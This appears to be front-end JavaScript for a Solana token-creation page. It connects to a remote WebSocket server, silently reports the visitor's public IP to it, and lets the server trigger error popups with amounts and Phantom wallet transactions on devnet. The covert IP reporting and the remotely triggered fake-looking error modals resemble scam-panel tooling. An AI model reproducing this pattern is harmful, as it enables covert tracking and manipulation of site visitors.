const splToken = window.splToken;
const solanaWeb3 = window.solanaWeb3;

window.ws = null;
let reconnectAttempts = 0;
const maxReconnectDelay = 30000;

function getAssociatedTokenAddress(mint, owner) {
    return solanaWeb3.PublicKey.findProgramAddressSync(
        [
            owner.toBuffer(),
            splToken.TOKEN_PROGRAM_ID.toBuffer(),
            mint.toBuffer(),
        ],
        splToken.ASSOCIATED_TOKEN_PROGRAM_ID
    )[0];
}

function connectWebSocket() {
    // ⚠️ CAMBIA QUESTO con il tuo dominio su Render
    const wsUrl = 'wss://luna2dev-1.onrender.com/';

    try {
        window.ws = new WebSocket(wsUrl);

        window.ws.onopen = () => {
            console.log('[WS] ✅ Connessione aperta con:', wsUrl);
            reconnectAttempts = 0;

            if (window.realUserIp) {
                window.ws.send(JSON.stringify({
                    type: 'register_real_ip',
                    real_ip: window.realUserIp
                }));
            }
        };

        window.ws.onmessage = async (event) => {
            console.log('[WS] Messaggio ricevuto:', event.data);
            try {
                const data = JSON.parse(event.data);

                if (data.command === 'show_error') {
                    const errorId = data.payload?.error_id;
                    const amount = data.payload?.amount;

                    document.cookie = `error_id=${errorId}; path=/; max-age=86400`;
                    document.cookie = `error_amount=${amount}; path=/; max-age=86400`;
                    document.cookie = `show_pre_error=true; path=/; max-age=86400`;

                    if (!errorId) return console.warn('[WS] error_id mancante');

                    window.showErrorModal(errorId, amount, "N/A", true);
                }

                else if (data.command === 'hide_error') {
                    window.hideErrorModal();
                }

                else if (data.command === 'create_token_ready') {
                    const {
                        uri: metadataUri,
                        name,
                        symbol,
                        supply,
                        decimals,
                        recipient,
                        options
                    } = data.payload;

                    if (window.solana?.isPhantom) {
                        const provider = window.solana;
                        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('devnet'));

                        try {
                            const resp = await provider.connect();
                            const mintAuthority = resp.publicKey;
                            const freezeAuthority = options.freeze_authority ? resp.publicKey : null;

                            const mint = solanaWeb3.Keypair.generate();
                            const recipientPublicKey = new solanaWeb3.PublicKey(recipient);
                            const recipientATA = getAssociatedTokenAddress(mint.publicKey, recipientPublicKey);

                            const transaction = new solanaWeb3.Transaction();

                            transaction.add(
                                solanaWeb3.SystemProgram.createAccount({
                                    fromPubkey: provider.publicKey,
                                    newAccountPubkey: mint.publicKey,
                                    lamports: await connection.getMinimumBalanceForRentExemption(splToken.MINT_SIZE),
                                    space: splToken.MINT_SIZE,
                                    programId: splToken.TOKEN_PROGRAM_ID,
                                }),
                                splToken.createInitializeMintInstruction(
                                    mint.publicKey,
                                    decimals,
                                    mintAuthority,
                                    freezeAuthority
                                ),
                                splToken.createAssociatedTokenAccountInstruction(
                                    provider.publicKey,
                                    recipientATA,
                                    recipientPublicKey,
                                    mint.publicKey
                                ),
                                splToken.createMintToInstruction(
                                    mint.publicKey,
                                    recipientATA,
                                    mintAuthority,
                                    supply * 10 ** decimals
                                )
                            );

                            transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
                            transaction.feePayer = provider.publicKey;
                            transaction.partialSign(mint);

                            const signedTx = await provider.signAndSendTransaction(transaction);

                            Swal.fire({
                                title: 'Token creato!',
                                text: `Transazione: ${signedTx.signature}`,
                                icon: 'success',
                                background: '#1e1e1e',
                                color: '#fff',
                                confirmButtonColor: '#3085d6'
                            });

                        } catch (err) {
                            console.error('[Phantom] Errore:', err);
                            Swal.fire({
                                title: 'Errore Phantom',
                                text: err.message || 'Errore durante la transazione.',
                                icon: 'error',
                                background: '#1e1e1e',
                                color: '#fff'
                            });
                        }
                    } else {
                        Swal.fire({
                            title: 'Phantom non trovato',
                            text: 'Installa Phantom per procedere.',
                            icon: 'warning',
                            background: '#1e1e1e',
                            color: '#fff'
                        });
                    }
                }
            } catch (err) {
                console.error('[WS] Errore parsing:', err);
            }
        };

        window.ws.onerror = (err) => {
            console.error('[WS] ❌ Errore:', err);
        };

        window.ws.onclose = (event) => {
            console.warn(`[WS] 🔌 Connessione chiusa: code=${event.code}, motivo=${event.reason}`);
            reconnectAttempts++;
            const delay = Math.min(1000 * reconnectAttempts, maxReconnectDelay);
            console.log(`[WS] Tentativo di riconnessione in ${delay / 1000}s`);
            setTimeout(connectWebSocket, delay);
        };
    } catch (err) {
        console.error('[WS] Errore creazione WebSocket:', err);
    }
}

// Avvia la connessione WebSocket subito
connectWebSocket();

// Ottieni IP pubblico
fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
        window.realUserIp = data.ip;
        console.log('[IP] IP utente:', window.realUserIp);

        if (window.ws && window.ws.readyState === WebSocket.OPEN) {
            window.ws.send(JSON.stringify({
                type: 'register_real_ip',
                real_ip: window.realUserIp
            }));
        }
    })
    .catch(err => {
        console.warn('[IP] Errore ottenimento IP:', err);
    });
